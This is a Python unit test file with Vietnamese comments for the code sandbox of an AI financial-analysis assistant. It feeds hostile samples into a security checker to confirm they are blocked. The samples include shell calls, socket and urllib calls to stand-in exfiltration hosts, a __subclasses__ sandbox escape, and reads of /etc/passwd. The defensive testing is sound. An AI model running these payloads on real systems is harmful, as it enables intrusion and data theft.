"""Bộ kiểm thử an toàn bảo mật Sandbox (Sandbox Security Test Suite).

Phục vụ đề tài: Trợ lý AI Phân tích Dữ liệu Kinh doanh & Dự báo Tài chính SME.

Mục tiêu kiểm thử:
1. Kiểm tra phát hiện và ngăn chặn mã độc gọi lệnh shell hệ thống (os.system, subprocess).
2. Kiểm tra ngăn chặn truy cập mạng và socket ra bên ngoài (socket, urllib, requests).
3. Kiểm tra ngăn chặn kỹ thuật Python Sandbox Escape qua Dunder Attributes (__subclasses__).
4. Kiểm tra ngăn chặn hàm thực thi động (eval, exec, __import__).
5. Kiểm tra ngăn chặn hành vi đọc file nhạy cảm ngoài thư mục Sandbox qua open().
6. Kiểm tra cơ chế tự động ngắt khi gặp vòng lặp vô hạn (Timeout Protection).
7. Kiểm tra tính hợp lệ của mã tính toán hợp pháp (Pandas data analysis & Matplotlib).
"""

import os
import tempfile
import unittest

from app.core.sandbox import (
    clean_python_code,
    execute_in_sandbox,
    inspect_code_security,
    is_docker_available,
)


class SandboxSecurityTests(unittest.TestCase):
    """Kiểm tra các kịch bản tấn công và bảo vệ của Sandbox."""

    def setUp(self):
        # Tạo file dữ liệu mẫu giả lập cho quá trình test
        self.temp_dir = tempfile.mkdtemp()
        self.sample_csv = os.path.join(self.temp_dir, "test_finance.csv")
        with open(self.sample_csv, "w", encoding="utf-8") as f:
            f.write("Thang,DoanhThu,ChiPhi\n1,100,60\n2,120,70\n3,150,80\n")

    def tearDown(self):
        try:
            if os.path.exists(self.sample_csv):
                os.remove(self.sample_csv)
            os.rmdir(self.temp_dir)
        except Exception:
            pass

    # --------------------------------------------------------------------------
    # 1. KIỂM ĐỊNH TĨNH AST CHẶN CÁC LỆNH GỌI NGUY HIỂM
    # --------------------------------------------------------------------------

    def test_block_os_system_command(self):
        """Kịch bản 1: Kẻ tấn công tiêm mã gọi shell os.system."""
        malicious_code = "import os\nos.system('dir')"
        is_safe, error = inspect_code_security(malicious_code)
        self.assertFalse(is_safe)
        self.assertIn("os.system", str(error))

    def test_block_subprocess_module(self):
        """Kịch bản 2: Kẻ tấn công nhập thư viện subprocess để spawn tiến trình."""
        malicious_code = "import subprocess\nsubprocess.run(['whoami'])"
        is_safe, error = inspect_code_security(malicious_code)
        self.assertFalse(is_safe)
        self.assertIn("subprocess", str(error))

    def test_block_network_socket_access(self):
        """Kịch bản 3: Kẻ tấn công mở socket gửi dữ liệu tài chính ra máy chủ ngoài."""
        malicious_code = "import socket\ns = socket.socket()\ns.connect(('malicious.site', 80))"
        is_safe, error = inspect_code_security(malicious_code)
        self.assertFalse(is_safe)
        self.assertIn("socket", str(error))

    def test_block_http_requests(self):
        """Kịch bản 4: Kẻ tấn công dùng urllib/requests để exfiltrate data."""
        malicious_code = "from urllib import request\nrequest.urlopen('http://leak-data.com')"
        is_safe, error = inspect_code_security(malicious_code)
        self.assertFalse(is_safe)
        self.assertIn("urllib", str(error))

    def test_block_eval_exec_dynamic_execution(self):
        """Kịch bản 5: Kẻ tấn công dùng eval/exec để né tránh kiểm tra chuỗi tĩnh."""
        eval_code = "eval('1 + 1')"
        is_safe, error = inspect_code_security(eval_code)
        self.assertFalse(is_safe)
        self.assertIn("eval", str(error))

        exec_code = "exec(\"import os; os.system('echo pwned')\")"
        is_safe, error = inspect_code_security(exec_code)
        self.assertFalse(is_safe)
        self.assertIn("exec", str(error))

    def test_block_dunder_sandbox_escape(self):
        """Kịch bản 6: Kỹ thuật kinh điển Python Sandbox Escape qua __subclasses__."""
        escape_code = "classes = ().__class__.__bases__[0].__subclasses__()"
        is_safe, error = inspect_code_security(escape_code)
        self.assertFalse(is_safe)
        self.assertIn("__subclasses__", str(error))

    def test_block_unauthorized_file_path_access(self):
        """Kịch bản 7: Cố gắng đọc tệp tin hệ thống máy chủ qua open()."""
        read_etc = "f = open('/etc/passwd', 'r')"
        is_safe, error = inspect_code_security(read_etc)
        self.assertFalse(is_safe)
        self.assertIn("open()", str(error))

        read_win = "f = open('C:/Windows/win.ini', 'r')"
        is_safe, error = inspect_code_security(read_win)
        self.assertFalse(is_safe)
        self.assertIn("open()", str(error))

    # --------------------------------------------------------------------------
    # 2. KIỂM THỬ THỰC THI SANDBOX ENGINE (END-TO-END)
    # --------------------------------------------------------------------------

    def test_execute_malicious_code_blocked_immediately(self):
        """Đảm bảo execute_in_sandbox chặn mã độc mà không hề khởi chạy tiến trình."""
        malicious_code = "import os; os.popen('whoami').read()"
        res = execute_in_sandbox(malicious_code, self.sample_csv, timeout=5)
        self.assertFalse(res["success"])
        self.assertEqual(res["security_status"], "blocked")
        self.assertIn("Cảnh báo Sandbox", res["stderr"])

    def test_execute_timeout_protection(self):
        """Kịch bản 8: Vòng lặp vô hạn (Infinite Loop) - Sandbox phải ngắt sau timeout."""
        infinite_code = "x = 0\nwhile True:\n    x += 1"
        res = execute_in_sandbox(infinite_code, self.sample_csv, timeout=2)
        self.assertFalse(res["success"])
        self.assertIn("giới hạn an toàn", res["stderr"])

    def test_execute_legitimate_data_analysis(self):
        """Kịch bản 9: Mã phân tích dữ liệu hợp lệ phải chạy thành công."""
        legit_code = """
import pandas as pd
df = pd.read_csv('test_finance.csv')
total_rev = df['DoanhThu'].sum()
print(f"Tổng doanh thu: {total_rev}")
"""
        res = execute_in_sandbox(legit_code, self.sample_csv, timeout=10)
        self.assertTrue(res["success"], f"Thực thi thất bại: {res['stderr']}")
        self.assertIn("Tổng doanh thu: 370", res["stdout"])
        self.assertEqual(res["security_status"], "passed")
        self.assertGreater(res["execution_time_ms"], 0)


if __name__ == "__main__":
    unittest.main()
